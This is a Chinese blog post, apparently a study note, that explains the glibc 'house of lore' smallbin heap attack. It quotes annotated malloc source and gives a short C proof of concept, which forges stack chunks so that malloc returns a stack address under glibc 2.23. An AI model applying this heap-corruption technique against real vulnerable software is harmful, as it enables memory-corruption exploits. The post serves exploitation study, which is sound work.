---
layout: post
title: house of lore：一种“smallbin attack”
category: Heap
date: 2023-9-23 21:04:32
---
Heap基础知识
<!-- more -->
[toc]
# house of lore

`house of lore`是针对`small bin`的一种攻击方法，和`unsorted bin attack`与`large bin  attack`很类似。个人感觉称之为`small bin attack`也没啥问题。

一句话描述该攻击方式：正常情况下，`small bin`取出一个`chunk`的时候会从末尾取出，这个`victim`的`bk`指针指向的是倒数第二个`chunk`，称为`bck`。此时检查`bck`的`fd`指针是否指向`victim`，通过检查后将`victim`取出，并将`bck`的`fd`指针指向`small bin`。若我们控制`victim`的`bk`指针，使其指向一个我们控制的`fake_chunk`，那么只需要控制该`fake_chunk`的`fd`指针指向了`victim`，这样以来便可以在取出`victim`的时候，将`fake_chunk`挂入`small bin`中。注意，取出`fake_chunk`的时候又需要经过`small bin`的检查，因此再此构造一个`fake_chunk2`，将`fake_chunk2`的`fd`指针指向`fake_chunk`，`fake_chunk`的`bk`指向`fake_chunk2`即可。

`small bin`取出的过程如下：

```c
if (in_smallbin_range(nb)) // 请求的大小位于smallbin
    {
        idx = smallbin_index(nb); // 请求的大小属于哪一个smallbin，找到下标idx
        bin = bin_at(av, idx);    // 通过下标找到具体的这个bin

        if ((victim = last(bin)) != bin) // last宏就是#define last(b) (b->bk)，因此就是定位到smallbin的最后一个chunk，而且smallbin不为空（bin->bk!=bin）
        {
            if (victim == 0) /* initialization check */
                             // 假如smallbin为空，那么这里不会进行分配，要到后面unsortedbin。合并所有的fastbin chunk，合并到unsorted bin里面去
                malloc_consolidate(av);
            else // 定位到了这个smallbin，取出里面的一个chunk，从队尾开始取
            {
                bck = victim->bk;                        // bck是victim的bk，也就是倒数第二个
                if (__glibc_unlikely(bck->fd != victim)) // bck的fd假如不为victim说明出错
                {
                    errstr = "malloc(): smallbin double linked list corrupted";
                    goto errout;
                }
                set_inuse_bit_at_offset(victim, nb); // 取出这个victim。也就是队尾的这一个。
                bin->bk = bck;                       // 取出后，bin的bk将会变成倒数第二个chunk
                bck->fd = bin;                       // 取出后，倒数第二个chunk将会指向small bin

                if (av != &main_arena) // 假如不是在主线程(main_arena)，添加上不是在main_arena的标记
                    victim->size |= NON_MAIN_ARENA;
                check_malloced_chunk(av, victim, nb);
                void *p = chunk2mem(victim); // 获得指向可用区域的指针
                alloc_perturb(p, bytes);
                return p; // 返回该指针
            }
        }
    }
```

笔者在`glibc 2.23`下，使用了以下代码成功完成攻击：

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    long fake_chunk[0x110]; // 在栈上伪造一个fake chunk，最终申请到这里表示攻击成功
    long fake_chunk2[0x110]; // 需要fake_chunk2，作用是最后从small bin中取出fake_chunk的时候，逃避检查
    printf("the addr of fake chunk is %p\n", fake_chunk);
    long* a = malloc(0x100); // 申请一个属于small bin的chunk
    malloc(0x20); // 防止被top chunk合并
    free(a); // chunk a会被置入 unsorted bin
    malloc(0x120); // 申请一个大chunk，这会让chunk a置入small bin 

    /* 攻击 */
    a[1] = &fake_chunk[0]; // chunk a的bk指针要指向fake_chunk
    fake_chunk[2] = a - 2; // fake_chunk的fd指针要指向chunk a 
    malloc(0x100); // 申请一个chunk a大小的chunk

    // 接下来我们希望能够取出fake_chunk，但是这个时候又会经历一次small bin的检查
    // 因此我们借助fake_chunk2来逃避检查
    // 只需要将fake_chunk的bk指向fake_chunk2，fake_chunk2的fd指向fake_chunk即可。
    fake_chunk[3] = &fake_chunk2[0]; // fake_chunk的bk指向fake_chunk2, fake_chunk2就是bck
    fake_chunk2[2] = &fake_chunk[0]; // fake_chunk2的fd必须指向fake_chunk
    long* b = malloc(0x100); // 再次申请一个
    printf("the addr of chunk b is %p.\n", b - 2); // 神奇地发现就是栈上的地址
    return 0;
}
```

## 